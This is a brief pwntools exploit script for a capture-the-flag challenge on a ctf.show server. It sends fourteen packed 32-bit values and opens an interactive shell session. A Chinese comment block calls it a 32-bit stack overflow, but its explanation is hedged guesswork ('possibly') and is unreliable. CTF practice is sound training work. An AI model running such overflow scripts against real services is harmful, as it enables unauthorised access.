from pwn import *
from LibcSearcher import *
from ctypes import c_uint

#context(arch = "amd64", os = 'linux', log_level = 'debug')
context(arch = "i386", os = 'linux', log_level = 'debug')

io = remote('pwn.challenge.ctf.show', 28224)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# payload = p32(17) * 14：构造攻击载荷
# 发送14个4字节的17，可能是利用某种特定的内存布局或漏洞
payload = p32(17) * 14

io.sendline(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：stack overflow - 32位栈溢出
2. 核心原理：
   - 利用栈溢出漏洞覆盖栈上的数据
   - 构造特定的payload格式
3. 关键分析：
   - payload = p32(17) * 14：发送14个4字节的17
   - 可能是利用程序中的特定逻辑或内存布局
4. 执行流程：
   - 构造并发送payload
   - 触发栈溢出漏洞
   - 可能通过覆盖特定变量或返回地址来执行恶意代码
5. 技术要点：
   - 32位程序的栈溢出利用
   - 理解程序的内存布局和漏洞点
"""
